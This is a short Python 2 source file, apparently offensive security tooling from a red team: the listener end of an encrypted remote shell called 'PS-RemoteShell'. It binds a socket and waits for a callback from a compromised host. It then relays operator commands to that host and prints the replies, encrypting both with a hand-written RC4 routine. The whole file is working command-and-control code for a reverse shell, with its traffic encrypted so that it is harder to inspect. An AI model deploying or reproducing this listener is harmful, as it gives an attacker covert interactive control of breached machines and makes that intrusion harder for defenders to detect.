# PS-RemoteShell Python Client
# Author: Mr.Un1k0d3r RingZer0 Team
import sys
import socket

version = "1.0"
buffer_size = 4096

def KSA(key):
    keylength = len(key)

    S = range(256)

    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % keylength]) % 256
        S[i], S[j] = S[j], S[i]

    return S


def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i] 

        K = S[(S[i] + S[j]) % 256]
        yield K


def RC4(plaintext, key):
	output = ""
	key = [ord(c) for c in key]
	S = KSA(key)
	keystream = PRGA(S)
	for c in plaintext:
		output = output + chr(ord(c) ^ keystream.next())
	return output


if __name__ == "__main__":
	print "PS-RemoteShell Python Client v%s\nMr.Un1k0d3r RingZer0 Team\n\n" % version
	if len(sys.argv) < 4:
		print "Usage: %s ip port key" % sys.argv[0]
		exit(0)
	
	ip = sys.argv[1]
	port = int(sys.argv[2])
	key = sys.argv[3]

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip, port))
	s.listen(1)
	
	print "[*] Waiting for a connection..."
	while True:
		conn, addr = s.accept()
		print "[+] Callback from %s:%d" % (addr[0], addr[1])
		
		data = True
		while data:
			data = conn.recv(4096)
			data = RC4(data, key)
			cmd = raw_input(data)
			if cmd == "":
				cmd = ";"
			cmd = RC4(cmd, key)
			conn.send(cmd)
	
